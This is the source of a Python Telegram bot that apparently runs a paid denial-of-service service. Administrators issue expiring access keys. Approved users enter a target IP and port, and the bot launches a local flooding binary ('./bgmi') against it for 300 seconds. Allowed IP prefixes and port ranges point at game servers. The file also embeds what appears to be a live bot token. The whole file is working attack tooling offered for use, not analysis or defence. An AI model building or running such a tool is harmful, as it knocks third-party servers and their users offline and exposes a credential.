import asyncio
import random
import secrets
from datetime import datetime, timedelta
from zoneinfo import ZoneInfo  # Added for IST support
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import ApplicationBuilder, MessageHandler, CommandHandler, filters, ContextTypes

# Bot Configuration
TOKEN = "8000254487:AAGIcn1Mp0gstyi2j-gcx4GdaFoHbPiEous"
BINARY_PATH = "./bgmi"
ATTACK_TIME = 300
ALLOWED_IP_PREFIXES = ("20.", "4.", "52.")
BLOCKED_PORTS = {10000, 10001, 10002, 17500, 20000, 20001, 20002, 443}
ALLOWED_PORT_RANGE = range(10003, 30000)
ADMIN_ID = 1821595166  # Replace with your Telegram user ID

# Data Stores
attacks = {}
approved_users = set()
valid_keys = {}  # key: expiration datetime

# Keyboards
main_keyboard = ReplyKeyboardMarkup([[KeyboardButton("🚀 ATTACK")]], resize_keyboard=True)
attack_keyboard = ReplyKeyboardMarkup(
    [
        [KeyboardButton("🟢 START ATTACK"), KeyboardButton("🔴 STOP ATTACK")],
        [KeyboardButton("⚫ RESET ATTACK")],
        [KeyboardButton("⚪ BACK")],
    ],
    resize_keyboard=True
)

# Decorator to check approval
def require_approval(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        if update.effective_user.id not in approved_users:
            await update.message.reply_text("❌ You are not approved to use this bot.")
            return
        return await func(update, context)
    return wrapper

# Start Command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Welcome! Use the menu below.", reply_markup=main_keyboard)

# Key Generator with Time Limit (includes IST)
async def generate_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ You are not authorized to generate keys.")
        return

    if not context.args:
        await update.message.reply_text("❌ Usage: /genkey <duration>\nExamples: 1h, 2d, 1m")
        return

    duration_str = context.args[0]
    unit = duration_str[-1]
    try:
        value = int(duration_str[:-1])
        if unit == 'h':
            expires = datetime.utcnow() + timedelta(hours=value)
        elif unit == 'd':
            expires = datetime.utcnow() + timedelta(days=value)
        elif unit == 'm':
            expires = datetime.utcnow() + timedelta(days=value * 30)  # Approximate month
        else:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Invalid duration. Use format like `1h`, `2d`, or `1m`", parse_mode="Markdown")
        return

    key = secrets.token_hex(4)
    valid_keys[key] = expires

    # Convert to IST
    ist_expiry = expires.replace(tzinfo=ZoneInfo("UTC")).astimezone(ZoneInfo("Asia/Kolkata"))
    expires_str = ist_expiry.strftime("%Y-%m-%d %I:%M:%S %p IST")

    await update.message.reply_text(f"✅ Key generated:\n`{key}`\nExpires: `{expires_str}`", parse_mode="Markdown")

# Redeem Key with Expiry Check
async def redeem_key(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("❌ Usage: /redeem <key>")
        return

    key = args[0]
    now = datetime.utcnow()

    if key in valid_keys:
        if valid_keys[key] < now:
            del valid_keys[key]
            await update.message.reply_text("❌ This key has expired.")
            return

        approved_users.add(update.effective_user.id)
        del valid_keys[key]
        await update.message.reply_text("✅ You are now approved to use the bot!")
    else:
        await update.message.reply_text("❌ Invalid or already used key.")

# Validate IP & Port
def validate_target(ip, port):
    try:
        port = int(port)
        if not ip.startswith(ALLOWED_IP_PREFIXES):
            return False
        if port in BLOCKED_PORTS or port not in ALLOWED_PORT_RANGE:
            return False
        return True
    except ValueError:
        return False

# Attack Menu
@require_approval
async def attack_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🎯 Enter Target (IP PORT)", reply_markup=attack_keyboard)

# Handle Attack Input
@require_approval
async def handle_attack_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        ip, port = update.message.text.split()
        if validate_target(ip, port):
            context.user_data["target"] = (ip, port)
            await update.message.reply_text(f"🎯 Target set: {ip}:{port}", reply_markup=attack_keyboard)
        else:
            await update.message.reply_text("❌ Invalid target! Use format: `1.1.1.1 1111`", parse_mode="Markdown")
    except ValueError:
        await update.message.reply_text("❌ Invalid format! Use: `<IP> <PORT>`", parse_mode="Markdown")

# Start Attack
@require_approval
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if "target" not in context.user_data:
        await update.message.reply_text("❌ Configure target first!", reply_markup=attack_keyboard)
        return
    ip, port = context.user_data["target"]
    try:
        process = await asyncio.create_subprocess_exec(BINARY_PATH, ip, str(port), str(ATTACK_TIME))
        attacks[update.message.from_user.id] = process
        effect = random.choice(["💥", "🔥", "⚡", "💣", "🚀"])
        await update.message.reply_text(f"{effect} Attack launched on `{ip}:{port}` for `{ATTACK_TIME}s`", parse_mode="Markdown")
    except Exception as e:
        await update.message.reply_text(f"❌ Attack failed: `{str(e)}`", parse_mode="Markdown")

# Stop Attack
@require_approval
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    if user_id not in attacks:
        await update.message.reply_text("❌ No active attack to stop!")
        return
    attacks[user_id].terminate()
    del attacks[user_id]
    await update.message.reply_text("🛑 Attack stopped successfully!")

# Reset Attack
@require_approval
async def reset_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.pop("target", None)
    await update.message.reply_text("🔄 Attack configuration reset", reply_markup=attack_keyboard)

# Back to Main Menu
@require_approval
async def back_to_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🔙 Returning to main menu.", reply_markup=main_keyboard)

# Main Function
def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("genkey", generate_key))
    app.add_handler(CommandHandler("redeem", redeem_key))
    app.add_handler(MessageHandler(filters.Regex("^🚀 ATTACK$"), attack_menu))
    app.add_handler(MessageHandler(filters.Regex("^🟢 START ATTACK$"), start_attack))
    app.add_handler(MessageHandler(filters.Regex("^🔴 STOP ATTACK$"), stop_attack))
    app.add_handler(MessageHandler(filters.Regex("^⚫ RESET ATTACK$"), reset_attack))
    app.add_handler(MessageHandler(filters.Regex("^⚪ BACK$"), back_to_main))
    app.add_handler(MessageHandler(filters.TEXT & filters.Regex(r"^\d+\.\d+\.\d+\.\d+ \d+$"), handle_attack_input))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()